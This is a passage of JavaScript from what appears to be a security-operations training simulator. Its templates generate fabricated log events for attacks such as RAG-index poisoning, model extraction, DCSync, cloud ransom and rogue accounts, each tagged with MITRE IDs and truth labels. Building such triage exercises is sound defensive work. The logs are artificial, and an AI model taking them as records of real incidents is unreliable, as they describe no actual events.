        { component: "rag-index", poisoned: 38, attack: "data-poisoning" }, "malicious", "AML.T0020");
    },
    ai_model_theft: function (rng, en, ts) {
      return wrap(ts, "web", "high", en["host.app"], en["ip.attacker"], null, null,
        "High-volume systematic queries against the model inference API (model extraction)",
        tstamp(ts) + " " + en["host.app"] + " " + en["ip.attacker"] +
        " 'POST /v1/inference HTTP/1.1' 200 queries=18420 rate=spike pattern=extraction",
        { endpoint: "/v1/inference", queries: 18420, attack: "model-extraction", src_ip: en["ip.attacker"] }, "malicious", "AML.T0024");
    },
    deepfake_call: function (rng, en, ts) {
      return wrap(ts, "syslog", "high", "helpdesk", en["ip.attacker"], null, en["user.finance"],
        "Finance approved a transfer after a video call from a deepfaked executive",
        tstamp(ts) + " conferencing: meeting=adhoc participant='CFO (spoofed)' verification=none outcome='wire approved' requestedBy=" +
        en["user.finance"],
        { channel: "video", deepfake: true, action: "wire-approved" }, "suspicious", "T1656");
    },
    ai_phish: function (rng, en, ts) {
      return wrap(ts, "syslog", "medium", "SRV-EHR-01", null, null, en["user.compromised"],
        "Highly tailored AI-generated spear-phish referencing real internal projects",
        tstamp(ts) + " mailgw postfix: from=<ceo@" + en["domain.phish"] + "> to=<" + en["user.compromised"] +
        "@bvhn.org> subj='Re: Q3 RAD upgrade, quick approval' quality=high-fidelity url=" + en["url.phish"],
        { sender: "ceo@" + en["domain.phish"], url: en["url.phish"], crafted: "ai-generated" }, "suspicious", "T1566");
    },
    dlp_block: function (rng, en, ts) {
      return wrap(ts, "firewall", "medium", en["host.victim"], en["ip.victim"], en["ip.exfil"], en["user.compromised"],
        "DLP blocked an outbound transfer containing PHI to " + en["domain.exfil"],
        tstamp(ts) + " dlp-proxy: user=" + en["user.compromised"] + " action=BLOCK rule='PHI-egress' dst=" +
        en["domain.exfil"] + " match='MRN,SSN' count=212",
        { action: "BLOCK", rule: "PHI-egress", matches: 212, domain: en["domain.exfil"] }, "suspicious", "T1567");
    },
    cloud_ransom: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "critical", "aws-account-4417", en["ip.attacker"], null, en["aws.access_key"],
        "Cloud backups deleted and S3 objects re-encrypted with an attacker KMS key (cloud ransom)",
        tstamp(ts) + ' {"eventName":"DeleteBackupVault","then":"PutObject:sse-kms-attacker","bucket":"' +
        en["aws.bucket"] + '","sourceIPAddress":"' + en["ip.attacker"] + '"}',
        { eventName: "DeleteBackupVault", impact: "cloud-ransom", bucket: en["aws.bucket"] }, "malicious", "T1486");
    },
    dcsync: function (rng, en, ts) {
      return wrap(ts, "windows", "critical", en["host.dc"], en["ip.victim"], en["ip.dc"], en["user.compromised"],
        "DCSync: replication of directory secrets requested by a non-DC account",
        tstamp(ts) + " DC-01 Security EventID=4662 Operation=DS-Replication-Get-Changes-All src=" + en["ip.victim"] +
        " By=" + en["user.compromised"] + " (not a domain controller)",
        { EventID: 4662, op: "DCSync", src_ip: en["ip.victim"] }, "malicious", "T1003.006");
    },
    rogue_account: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.dc"], null, null, en["user.compromised"],
        "New privileged account created off-hours and added to a sensitive group",
        tstamp(ts) + " DC-01 Security EventID=4720 NewAccount='svc-helpdesk2' then 4732 AddTo='Backup Operators' By=" +
        en["user.compromised"],
        { EventID: 4720, newAccount: "svc-helpdesk2", group: "Backup Operators" }, "malicious", "T1136.002");
    },
    tor_login: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "high", "m365-tenant", en["ip.attacker"], null, en["user.compromised"],
        "Successful sign-in for " + en["user.compromised"] + " from a known Tor exit node",
        tstamp(ts) + " AAD SignIn: user=" + en["user.compromised"] + " result=Success ip=" + en["ip.attacker"] +
        " ipReputation=tor-exit geo=" + en["geo.adversary"],
        { result: "Success", ipReputation: "tor-exit", geo: en["geo.adversary"] }, "suspicious", "T1090.003");
    },
    decoy_fp: function (rng, en, ts, p) {
      // A benign-but-scary looking line, to teach false-positive triage.
      var u = rng.pick(E.USERS);
      var h = rng.pick(E.INTERNAL_HOSTS);
      return wrap(ts, "windows", "medium", h.name, h.ip, null, u.sam,
        "Multiple 4625 from " + u.sam + " (cached creds after password change)",
        tstamp(ts) + " " + h.name + " Security EventID=4625 User=" + u.sam +
        " LogonType=2 Status=0xC000006A reason=stale-cached-credential",
        { EventID: 4625, LogonType: 2 }, "benign", "T1110");
    }
  };

  function wrap(ts, source, severity, host, src_ip, dst_ip, user, msg, raw, fields, truthLabel, mitre) {
    return {
      id: nid(), ts: ts, source: source, severity: severity, host: host,
      src_ip: src_ip, dst_ip: dst_ip, user: user, msg: msg, raw: raw,
      fields: fields || {}, origin: "scenario", truthLabel: truthLabel || "suspicious",
      mitre: mitre || null
    };
  }

  function renderEvent(evt, rng, entities, ts) {
    var fn = T[evt.template];
    if (!fn) {
      return wrap(ts, evt.source || "syslog", evt.severity || "medium", null, null, null, null,
        evt.msg || ("event:" + evt.template), evt.raw || (tstamp(ts) + " " + (evt.msg || evt.template)),
        evt.fields || {}, evt.truthLabel || "suspicious", evt.mitre || null);
    }
    var log = fn(rng, entities, ts, evt.params || {});
    if (evt.severity) log.severity = evt.severity;
    return log;
  }

  SOC.logEngine = {
    SOURCES: SOURCES,
    makeNoise: makeNoise,
    renderEvent: renderEvent,
    templates: T
  };
})();
